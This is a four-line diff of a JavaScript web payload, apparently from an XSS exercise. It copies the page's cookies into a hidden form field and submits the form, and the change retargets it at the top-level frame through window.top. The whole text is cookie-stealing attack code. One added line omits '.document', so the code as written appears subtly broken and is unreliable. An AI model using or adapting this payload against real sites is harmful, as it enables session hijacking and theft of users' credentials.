@@ -1,4 +1,4 @@
-form = document.getElementById("submitme");
-cookie = document.getElementById("cookie")
-cookie.value = document.cookie
+form = window.top.document.getElementById("submitme");
+cookie = window.top.getElementById("cookie")
+cookie.value = window.top.document.cookie
 form.submit()
